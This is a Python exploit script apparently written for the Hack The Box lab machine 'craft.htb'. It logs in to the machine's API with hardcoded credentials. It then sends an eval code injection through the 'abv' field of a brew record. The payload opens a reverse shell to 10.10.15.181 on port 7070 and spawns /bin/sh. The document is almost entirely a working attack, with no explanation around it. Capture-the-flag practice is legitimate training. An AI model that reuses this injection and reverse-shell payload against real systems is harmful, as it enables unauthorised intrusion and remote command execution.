import requests
import json
import urllib3

urllib3.disable_warnings()

url = "https://api.craft.htb/api/"
s = requests.Session()
r = s.get(url + "auth/login", auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
token = json.loads(r.text)['token']
print(token)

data = {
    "abv"       : 'eval(compile("""for x in range(1):\n import socket,subprocess, os\n s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n s.connect(("10.10.15.181", 7070))\n os.dup2(s.fileno(),0)\n os.dup2(s.fileno(),1)\n os.dup2(s.fileno(),2)\n import pty\n pty.spawn("/bin/sh")""","","single"))',
    "name"      : "test",
    "brewer"    : "test",
    "style"     : "test"
}
data = json.dumps(data)

headers = {
    'X-Craft-API-Token': token,
    'Content-Type': 'application/json'
}
r = s.post(url + "brew/", headers=headers, data=data)
print(r.text)
